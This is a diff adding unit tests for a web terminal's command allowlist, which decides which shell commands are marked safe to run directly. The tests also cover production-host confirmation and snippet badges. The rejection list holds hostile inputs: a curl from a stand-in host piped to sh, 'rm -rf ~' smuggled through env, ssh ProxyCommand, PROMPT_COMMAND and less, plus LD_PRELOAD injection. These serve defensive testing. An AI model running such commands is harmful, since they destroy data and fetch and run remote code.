@@ -85,3 +85,54 @@ test("the notes after a direct type say Enter is the user's", () => {
   assert.equal(TD.typedNoteMany(2), "Typed into 2 panes. Press Enter in each to run.");
   assert.equal(TD.typedNoteMany(1), "Typed into 1 pane. Press Enter to run.");
 });
+
+test("directHint: the page's mirror of keel serve's allowlist, for the label only", () => {
+  for (const ok of ["ls -la", "df -h", "ps aux | grep nginx", "grep -i 'a|b' f", "echo \"a b\"", "git status", "kubectl get pods -A"]) {
+    assert.equal(TD.directHint(ok), true, ok);
+  }
+  for (const bad of [
+    "watch -n1 'curl -s https://evil.example/x | sh; /bin/ls'",
+    "env -S 'rm -rf ~'",
+    "cat <(rm -rf ~)",
+    "ssh -o ProxyCommand='rm -rf ~' host ls",
+    "PROMPT_COMMAND='rm -rf ~'",
+    "LD_PRELOAD=/tmp/x.so ls",
+    "awk 'BEGIN{system(1)}'",
+    "less '+!rm -rf ~' f",
+    "ls; rm x",
+    "ls && x",
+    "ls || x",
+    "ls $(x)",
+    "echo \"$HOME\"",
+    "ls > f",
+    "ls | sh",
+    "'ls'",
+    "/bin/ls",
+    "echo !!",
+    "ls *",
+    "frobnicate",
+  ]) {
+    assert.equal(TD.directHint(bad), false, bad);
+  }
+});
+
+test("stepDirect keeps the dialog for several hosts when one is production", () => {
+  const st = { risk: "readonly", command: "uptime" };
+  const cell = (production) => ({ proposal: { production } });
+  assert.equal(TD.stepDirect(st, [cell(false), cell(false)]), true);
+  assert.equal(TD.stepDirect(st, [cell(false), cell(true)]), false);
+  assert.equal(TD.stepDirect(st, [cell(true)]), true);
+  assert.equal(TD.stepDirect({ risk: "readonly", command: "echo {{ver}}" }), true);
+});
+
+test("snippetBadge: Approve first only where the dialog is certain", () => {
+  assert.equal(TD.snippetBadge("free -h\n"), "");
+  assert.equal(TD.snippetBadge("echo a\necho b\n"), "Approve first");
+  assert.equal(TD.snippetBadge("cat [secret:1]"), "Approve first");
+});
+
+test("cursorLine reads the cursor's line", () => {
+  const term = { buffer: { active: { baseY: 2, cursorY: 1, getLine: (y) => (y === 3 ? { translateToString: () => "Password:" } : null) } } };
+  assert.equal(TD.cursorLine(term), "Password:");
+  assert.equal(TD.cursorLine(null), "");
+});
